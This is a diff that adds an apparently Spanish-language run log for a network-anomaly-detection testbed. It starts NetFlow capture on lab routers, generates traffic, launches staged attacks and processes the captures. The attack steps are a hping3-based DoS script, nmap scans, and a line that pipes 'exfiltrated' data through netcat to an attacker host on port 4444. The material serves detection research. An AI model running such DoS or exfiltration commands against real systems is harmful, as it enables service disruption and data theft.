@@ -1,0 +1,75 @@
+------------------------------------
+Lista de comandos de ejecucion:
+t=0s	ssh nesg@routerR1 "cd git/VERITASExperimentalScripts/machines/routers/capturas; rm nfcapd*"
+t=0s	ssh nesg@routerR2 "cd git/VERITASExperimentalScripts/machines/routers/capturas; rm nfcapd*"
+t=0s	ssh nesg@routerR3 "cd git/VERITASExperimentalScripts/machines/routers/capturas; rm nfcapd*"
+t=0s	ssh nesg@borderRouter "cd git/VERITASExperimentalScripts/machines/routers/capturas; rm nfcapd*"
+t=1s	ssh nesg@routerR1 "cd git/VERITASExperimentalScripts/machines/routers/scripts/; sudo ./activateNetflow.sh"
+t=1s	ssh nesg@routerR2 "cd git/VERITASExperimentalScripts/machines/routers/scripts/; sudo ./activateNetflow.sh"
+t=1s	ssh nesg@routerR3 "cd git/VERITASExperimentalScripts/machines/routers/scripts/; sudo ./activateNetflow.sh"
+t=1s	ssh nesg@borderRouter "cd git/VERITASExperimentalScripts/machines/routers/scripts/; sudo ./activateNetflow.sh"
+t=1s	ssh nesg@routerR1 "cd git/VERITASExperimentalScripts/machines/MSNMsensor/scripts/; ./start.sh"
+t=1s	ssh nesg@routerR2 "cd git/VERITASExperimentalScripts/machines/MSNMsensor/scripts/; ./start.sh"
+t=1s	ssh nesg@routerR3 "cd git/VERITASExperimentalScripts/machines/MSNMsensor/scripts/; ./start.sh"
+t=1s	ssh nesg@borderRouter "cd git/VERITASExperimentalScripts/machines/MSNMsensor/scripts/; ./start.sh"
+t=5s	ssh nesg@m1.2 "cd git/VERITASExperimentalScripts/machines/clients/scripts/; ./trafficGenerator.py  -n 30 -t 90180 -d wwwserver.txt > tmp.txt"
+t=5s	ssh nesg@m2.2 "cd git/VERITASExperimentalScripts/machines/clients/scripts/; ./trafficGenerator.py  -n 30 -t 90180 -d wwwserver.txt > tmp.txt"
+t=5s	ssh nesg@m3.2 "cd git/VERITASExperimentalScripts/machines/clients/scripts/; ./trafficGenerator.py  -n 30 -t 90180 -d wwwserver.txt > tmp.txt"
+t=8s	ssh nesg@m1.2 "cd git/VERITASExperimentalScripts/machines/clients/scripts/; ./trafficGenerator.py  -n 10 -t 90180 -d dmz.txt > tmp.txt"
+t=8s	ssh nesg@m2.2 "cd git/VERITASExperimentalScripts/machines/clients/scripts/; ./trafficGenerator.py  -n 10 -t 90180 -d dmz.txt > tmp.txt"
+t=8s	ssh nesg@m3.2 "cd git/VERITASExperimentalScripts/machines/clients/scripts/; ./trafficGenerator.py  -n 10 -t 90180 -d dmz.txt > tmp.txt"
+t=86520s	ssh nesg@m3.2 "cd git/VERITASExperimentalScripts/attacks; sudo ./DoSattack.py  --speed faster -s 192.168.3.8 172.16.0.4 > tmp.log"
+t=86820s	ssh nesg@m3.2 "sudo killall hping3"
+t=87420s	ssh nesg@m3.2 "cd git/VERITASExperimentalScripts/attacks; sudo ./DoSattack.py  --speed fast -s 192.168.3.8 172.16.0.4 > tmp.log"
+t=87720s	ssh nesg@m3.2 "sudo killall hping3"
+t=88320s	ssh nesg@m1.2 "cd git/VERITASExperimentalScripts/attacks; ./nmapGenerator.py -i 3 -d 300 172.16.0.254>tmp.log"
+t=89220s	ssh nesg@atacante "nc -l -p 4444 > tmp.txt"
+t=89222s	ssh nesg@m2.2 "cd git/VERITASExperimentalScripts/attacks; ./informationExfiltrated.py | nc 10.0.0.2 4444"
+t=89520s	ssh nesg@atacante "killall nc"
+
+Lista de comandos de procesado:
+t=0s	ssh nesg@routerR1 "cd git/VERITASExperimentalScripts/machines/routers/scripts/; sudo ./deactivateNetflow.sh"
+t=0s	ssh nesg@routerR2 "cd git/VERITASExperimentalScripts/machines/routers/scripts/; sudo ./deactivateNetflow.sh"
+t=0s	ssh nesg@routerR3 "cd git/VERITASExperimentalScripts/machines/routers/scripts/; sudo ./deactivateNetflow.sh"
+t=0s	ssh nesg@borderRouter "cd git/VERITASExperimentalScripts/machines/routers/scripts/; sudo ./deactivateNetflow.sh"
+t=0s	ssh nesg@routerR1 "cd git/VERITASExperimentalScripts/machines/MSNMsensor/scripts/; ./stop.sh"
+t=0s	ssh nesg@routerR2 "cd git/VERITASExperimentalScripts/machines/MSNMsensor/scripts/; ./stop.sh"
+t=0s	ssh nesg@routerR3 "cd git/VERITASExperimentalScripts/machines/MSNMsensor/scripts/; ./stop.sh"
+t=0s	ssh nesg@borderRouter "cd git/VERITASExperimentalScripts/machines/MSNMsensor/scripts/; ./stop.sh"
+t=0s	ssh nesg@routerR1 "cd git/VERITASExperimentalScripts/machines/routers/scripts; ./renameCaptureFiles.sh"
+t=0s	ssh nesg@routerR2 "cd git/VERITASExperimentalScripts/machines/routers/scripts; ./renameCaptureFiles.sh"
+t=0s	ssh nesg@routerR3 "cd git/VERITASExperimentalScripts/machines/routers/scripts; ./renameCaptureFiles.sh"
+t=0s	ssh nesg@borderRouter "cd git/VERITASExperimentalScripts/machines/routers/scripts; ./renameCaptureFiles.sh"
+t=0s	mkdir ../resultados/jerarquico3.1708102100
+t=0s	cd ../resultados/jerarquico3.1708102100; mkdir borderRouter routerR1 routerR2 routerR3
+t=0s	scp nesg@routerR1:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/jerarquico3.1708102100/routerR1
+t=0s	scp nesg@routerR2:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/jerarquico3.1708102100/routerR2
+t=0s	scp nesg@routerR3:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/jerarquico3.1708102100/routerR3
+t=0s	scp nesg@borderRouter:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/jerarquico3.1708102100/borderRouter
+t=0s	cd ../resultados/jerarquico3.1708102100; nfdump -R borderRouter -q -o csv > borderRouter.csv
+t=0s	cd ../resultados/jerarquico3.1708102100; nfdump -R routerR1 -q -o csv > routerR1.csv
+t=0s	cd ../resultados/jerarquico3.1708102100; nfdump -R routerR2 -q -o csv > routerR2.csv
+t=0s	cd ../resultados/jerarquico3.1708102100; nfdump -R routerR3 -q -o csv > routerR3.csv
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR1 -t private -s 192.168.3.8 -n 200 -r 192.168.3.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR2 -t private -s 192.168.3.8 -n 200 -r 192.168.3.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR3 -t private -s 192.168.3.8 -n 200 -r 192.168.3.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f borderRouter -t private -s 192.168.3.8 -n 200 -r 192.168.3.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR1 -t private -s 192.168.1.2 -n 30 -r 192.168.1.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR2 -t private -s 192.168.1.2 -n 30 -r 192.168.1.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR3 -t private -s 192.168.1.2 -n 30 -r 192.168.1.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f borderRouter -t private -s 192.168.1.2 -n 30 -r 192.168.1.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR1 -t private -s 192.168.2.2 -n 30 -r 192.168.2.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR2 -t private -s 192.168.2.2 -n 30 -r 192.168.2.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR3 -t private -s 192.168.2.2 -n 30 -r 192.168.2.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f borderRouter -t private -s 192.168.2.2 -n 30 -r 192.168.2.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR1 -t private -s 192.168.3.2 -n 30 -r 192.168.3.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR2 -t private -s 192.168.3.2 -n 30 -r 192.168.3.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR3 -t private -s 192.168.3.2 -n 30 -r 192.168.3.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f borderRouter -t private -s 192.168.3.2 -n 30 -r 192.168.3.
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR1 -t public -s 10.0.0.1 -n 100 -r x
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR2 -t public -s 10.0.0.1 -n 100 -r x
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f routerR3 -t public -s 10.0.0.1 -n 100 -r x
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/spoofIP.py -f borderRouter -t public -s 10.0.0.1 -n 100 -r x
+t=0s	cd ../resultados/jerarquico3.1708102100; ../../scripts/plot.py *.csv
+------------------------------------
+
